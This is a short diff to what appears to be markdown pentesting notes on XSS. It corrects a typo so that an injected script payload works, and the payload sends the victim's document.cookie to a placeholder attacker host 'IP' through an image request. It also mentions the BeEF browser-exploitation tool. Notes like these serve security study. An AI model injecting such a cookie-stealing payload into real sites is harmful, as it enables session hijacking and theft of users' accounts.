@@ -129,7 +129,7 @@ This can be however filtered out by user's browser
 1. Find XSS vulnerability
 2. Craft and inject payload
 ```
-<scirpt>new Image().src="http://IP/some.jpg?output="+document.cookie;</script>
+<script>new Image().src="http://IP/some.jpg?output="+document.cookie;</script>
 ```
 
 ### Use Kali's BeEF
